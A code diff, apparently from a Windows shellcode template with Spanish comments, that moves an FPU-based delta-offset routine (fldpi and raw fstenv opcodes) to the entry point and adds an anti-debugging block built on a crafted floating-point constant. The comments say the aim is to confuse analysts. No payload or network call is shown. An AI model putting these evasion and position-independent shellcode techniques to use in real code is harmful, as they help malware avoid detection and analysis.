@@ -13,6 +13,43 @@ void LoadFunctions(DWORD numHashes);
 
 void __declspec(naked) main(){
     __asm{
+    #ifdef SC_DELTA
+        /*###############################################################################
+        ** Obtención del Delta offset:
+        **    Obtenemos la posición relativa de nuestro código.
+        **    Utilizamos un código poco común que utiliza la FPU.
+        **    Primero utilizamos 'fldpi' para actualizar el entorno de FPU
+        **    rellenando el item 'FPUInstructionPointer' de la estructura
+        **    con la dirección de la última instrucción FPU ('fldz')
+        **    Por último cargamos la estructura de entorno con ('fstenv') 
+        **    de tal forma que el item que necesitamos quede en esp y lo sacamos a edi.
+        **    NOTAS{
+        **        1: Se harcodean los opcodes para evitar tanto la comprobación
+        **        de errores de FP como para evitar el byte superfluo que añade
+        **        el visualC
+        **        2: La instrucción 'fldpi' en realidad hace un push PI en el stack FPU
+        **        (Quién analice el código no sabrá que coño pasa jajaja)
+        **    }
+        *###############################################################################*/
+find_delta:
+        fldpi
+        EMIT_BYTE_ARRAY(
+            (0xD9) (0x74) (0x24) (0xF4)    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
+        )
+        pop  edi
+        #ifdef SC_NULL
+        add  edi, K
+        sub  edi, (find_delta+K)
+        #else
+        sub  edi, find_delta
+        #endif
+        #ifdef ANTI_DEBUG
+        fld tbyte ptr[magic]
+        jmp over
+  magic:EMIT_BYTE_ARRAY((0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) ('=') ('@'))
+   over:
+        #endif
+    #endif
         //Pasamos inicio real del código saltando sobre las constantes.
         jmp  start
     }
@@ -94,37 +131,6 @@ conti:
         ret
 #endif
 start:
-#ifdef SC_DELTA
-        /*###############################################################################
-        ** Obtención del Delta offset:
-        **    Obtenemos la posición relativa de nuestro código.
-        **    Utilizamos un código poco común que utiliza la FPU.
-        **    Primero utilizamos 'fldpi' para actualizar el entorno de FPU
-        **    rellenando el item 'FPUInstructionPointer' de la estructura
-        **    con la dirección de la última instrucción FPU ('fldz')
-        **    Por último cargamos la estructura de entorno con ('fstenv') 
-        **    de tal forma que el item que necesitamos quede en esp y lo sacamos a edi.
-        **    NOTAS{
-        **        1: Se harcodean los opcodes para evitar tanto la comprobación
-        **        de errores de FP como para evitar el byte superfluo que añade
-        **        el visualC
-        **        2: La instrucción 'fldpi' en realidad hace un push PI en el stack FPU
-        **        (Quién analice el código no sabrá que coño pasa jajaja)
-        **    }
-        *###############################################################################*/
-find_delta:
-        fldpi
-        EMIT_BYTE_ARRAY(
-            (0xD9) (0x74) (0x24) (0xF4)    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
-        )
-        pop  edi
-        #ifdef SC_NULL
-        add  edi, K
-        sub  edi, (find_delta+K)
-        #else
-        sub  edi, find_delta
-        #endif
-#endif
         /*###############################################################################
         ** Creación del stack de direcciones:
         **    Lo primero que hacemos es reservar espacio en el stack para almacenar
